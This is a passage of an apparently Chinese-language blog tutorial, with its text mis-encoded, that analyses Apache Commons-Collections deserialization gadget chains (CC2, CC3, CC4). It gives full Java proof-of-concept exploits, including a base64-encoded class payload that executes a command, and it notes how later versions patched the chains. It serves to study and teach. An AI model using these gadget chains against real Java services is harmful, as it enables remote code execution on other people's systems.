class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;)<br>        &#125;;<br>        <br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, transformerChain);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tiedMapEntry, <span class="hljs-string">&quot;xxx&quot;</span>);<br><br>        lazyMap.remove(<span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(expMap);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728215703672.png" alt="image-20240728215703672"></p><h2 id="CC2"><a href="#CC2" class="headerlink" title="CC2"></a>CC2</h2><p>å‰é¢å°±æåˆ°ï¼ŒCommons-Collectionæœ‰ä¿©å®˜æ–¹çš„åŒ…ï¼š</p><ul><li>commons-collections:commons-collections</li><li>org.apache.commons:commons-collections4</li></ul><p>ä¸¤è€…çš„å‘½åç©ºé—´ä¸å†²çªï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å…±å­˜åœ¨åŒâ¼€ä¸ªé¡¹ç›®ä¸­ã€‚</p><p>ä½¿ç”¨</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>ä¹‹å‰æˆ‘ä»¬ç ”ç©¶çš„åˆ©ç”¨é“¾<code>CC1ã€CC6ã€CC3</code>åœ¨<code>commons-collections4</code>å‡èƒ½æ­£å¸¸ä½¿ç”¨ï¼Œä¸è¿‡æ–¹æ³•åå¯èƒ½ç¨æœ‰å˜åŠ¨ï¼Œå…¶å®å°±æ˜¯<code>Lazymap</code>å¤„decorateæ²¡äº†ï¼š</p><p>åŸdecorate:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªâ½…æ³•ä¸è¿‡å°±æ˜¯<code>LazyMap</code>æ„é€ å‡½æ•°çš„â¼€ä¸ªåŒ…è£…ï¼Œâ½½åœ¨4ä¸­å…¶å®åªæ˜¯æ”¹äº†ä¸ªåå­—å«<code>lazymap</code>ã€‚</p><p>4ä¸­çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> &lt;V, K&gt; LazyMap&lt;K, V&gt; <span class="hljs-title function_">lazyMap</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;K, V&gt; map, <span class="hljs-keyword">final</span> </span><br><span class="hljs-params">Transformer&lt;? <span class="hljs-built_in">super</span> K, ? extends V&gt; factory)</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>&lt;K,V&gt;(map, factory);<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†Gadgetä¸­å‡ºé”™çš„ä»£ç æ¢â¼€ä¸‹åå­—ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.lazyMap(innerMap, transformerChain);<br></code></pre></td></tr></table></figure><p>ç„¶åå¼¹calcæ˜¯ä¸€æ ·çš„ã€‚</p><p>ç”±æ­¤å¯å¾—ï¼ŒCCé“¾å®é™…ä¸Šå°±æ˜¯ä¸€æ¡<code>Serializable#readObject()</code>åˆ°<code>Transformer#transform()</code>çš„è°ƒç”¨é“¾ã€‚</p><p>è¦çœ‹CC2ï¼Œé‚£ä¹ˆè¿™é‡Œå°±éœ€è¦å¼•å…¥ä¸¤ä¸ªæ–°ç±»ï¼š</p><ul><li><code>java.util.PriorityQueue</code></li><li><code>org.apache.commons.collections4.comparators.TransformingComparator</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PriorityQueue</span>&lt;E&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractQueue</span>&lt;E&gt;<br>    <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span>&#123;<br>            s.defaultReadObject();<br>            s.readInt();<br>            queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[size];<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; size; i++)<br>                queue[i] = s.readObject();<br>            heapify();<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">heapify</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> (size &gt;&gt;&gt; <span class="hljs-number">1</span>) - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>            siftDown(i, (E) queue[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// TransformingComparator#compare</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(<span class="hljs-keyword">final</span> I obj1, <span class="hljs-keyword">final</span> I obj2)</span> &#123;<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value1</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj1);<br>    <span class="hljs-keyword">final</span> <span class="hljs-type">O</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.transformer.transform(obj2);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.decorated.compare(value1, value2);<br>&#125;<br></code></pre></td></tr></table></figure><p>Gadget chainsï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">PriorityQueue#readObject() =&gt; <br>heapify() =&gt; <br>siftDown() =&gt; <br>siftDownUsingComparator() =&gt; <br>comparator.compare() =&gt; <br>transformer.transform()<br></code></pre></td></tr></table></figure><ul><li><code>heapify</code> <code>int i = (size &gt;&gt;&gt; 1) - 1</code>éœ€è¦éè´Ÿ</li><li><code>siftDownUsingComparator</code> <code>half = size &gt;&gt;&gt; 1</code>éœ€è¦å¤§äºä¸Šé¢çš„i</li></ul><p>è€Œä¸”<code>PriorityQueue</code>æ„é€ å‡½æ•°ä¸ä¼šç»™sizeèµ‹åˆå€¼ï¼Œéœ€è¦ç”¨åå°„å»èµ‹å€¼ã€‚</p><h3 id="POC-4"><a href="#POC-4" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<br>                        <span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;Runtime.class, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(chainedTransformer);<br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">pq</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(comparator);<br>        setFieldValue(pq, <span class="hljs-string">&quot;size&quot;</span>, <span class="hljs-number">4</span>);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(pq);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object) ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/07/28/Commons-Collections/image-20240728222834295.png" alt="image-20240728222834295"></p><h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator</code>åœ¨<code>commons-collections4.0</code>ä»¥å‰æ˜¯ç‰ˆæœ¬æ²¡æœ‰å®ç°<code>Serializable</code>æ¥å£</p><p>å®˜æ–¹å‘å¸ƒçš„æ–°ç‰ˆæœ¬4.1å’Œ3.2.2ç”¨äºä¿®å¤CCé“¾3.2.2ä¸­å¢åŠ äº†â¼€ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">FunctorUtils#checkUnsafeSerialization`<br></code></pre></td></tr></table></figure><p>å®ƒç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ˜¯å¦å®‰å…¨ï¼Œå…¶ä¼šæ£€æŸ¥å¸¸â»…çš„å±é™©Transformerç±»ï¼Œå½“æˆ‘ä»¬ååºåˆ—åŒ–åŒ…å«è¿™äº›å¯¹è±¡æ—¶å°±ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚ è‹¥å¼€å‘è€…æ²¡æœ‰è®¾ç½®å…¨å±€é…ç½® <code>org.apache.commons.collections.enableUnsafeSerialization=true</code> å³é»˜è®¤æƒ…å†µä¸‹ä¼šæŠ›å‡ºå¼‚å¸¸</p><p>4.1ä¸­è¿™å‡ ä¸ªå±é™©çš„<code>Transformer</code>ç±»ä¸å†å®ç°<code>Serializable</code>æ¥å£ï¼Œç›´æ¥ä¸èƒ½åºåˆ—åŒ–å’Œååºåˆ—åŒ–ã€‚</p><p><strong>å› æ­¤CC2åªèƒ½åœ¨<code>commons-collections4.0</code>ä¸Šè·‘é€šã€‚</strong></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>CC4è·ŸCC2å¾ˆæ¥è¿‘ã€‚éƒ½æ˜¯åœ¨Commons-Collections4çš„åŸºç¡€ä¸Šçš„CCé“¾ã€‚</p><p>è€Œæœ¬è´¨å…¶å®CC4å°±æ˜¯ç”¨<code>InstantiateTransformer</code>ä»£æ›¿äº†CC2çš„<code>InvokerTransformer</code>ï¼Œå€Ÿç”¨ä¸€ä¸‹<code>ysoserial</code>çš„ä»£ç ,å…¶å®å°±æ˜¯<code>CommonsCollections2</code>çš„<code>TemplatesImpl</code>å˜ä½“ï¼ŒæŠŠCC2å’ŒCC3æ‹¼æ¥ä¸€ä¸‹ï¼Œå°±å¾—åˆ°äº†CC4ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Comparator;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC4</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADMANAoACAAkCgAlACYIACcKACUAKAcAKQoABQAqBwArBwAsAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABxMc2VyL2V2YWxDbGFzc1RlbXBsYXRlc0ltcGw7AQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACkV4Y2VwdGlvbnMHAC0BAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHACkBAApTb3VyY2VGaWxlAQAbZXZhbENsYXNzVGVtcGxhdGVzSW1wbC5qYXZhDAAJAAoHAC4MAC8AMAEABGNhbGMMADEAMgEAE2phdmEvbGFuZy9FeGNlcHRpb24MADMACgEAGnNlci9ldmFsQ2xhc3NUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAQAAQAJAAoAAQALAAAALwABAAEAAAAFKrcAAbEAAAACAAwAAAAGAAEAAAAJAA0AAAAMAAEAAAAFAA4ADwAAAAEAEAARAAIACwAAAD8AAAADAAAAAbEAAAACAAwAAAAGAAEAAAAVAA0AAAAgAAMAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAFAAVAAIAFgAAAAQAAQAXAAEAEAAYAAIACwAAAEkAAAAEAAAAAbEAAAACAAwAAAAGAAEAAAAaAA0AAAAqAAQAAAABAA4ADwAAAAAAAQASABMAAQAAAAEAGQAaAAIAAAABABsAHAADABYAAAAEAAEAFwAIAB0ACgABAAsAAABhAAIAAQAAABK4AAISA7YABFenAAhLKrYABrEAAQAAAAkADAAFAAMADAAAABYABQAAAAwACQAPAAwADQANAA4AEQAQAA0AAAAMAAEADQAEAB4AHwAAACAAAAAHAAJMBwAhBAABACIAAAACACM=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templatesImpl</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br>        setFieldValue(templatesImpl, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templatesImpl &#125; ),<br>        &#125;;<br>        <span class="hljs-comment">//åŒ…è£…innerMapï¼Œå›è°ƒTransformedMap.decorate</span><br>        <span class="hljs-comment">//é˜²æ­¢payloadç”Ÿæˆè¿‡ç¨‹ä¸­è§¦å‘ï¼Œå…ˆæ”¾è¿›å»ä¸€ä¸ªç©ºçš„Transform</span><br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 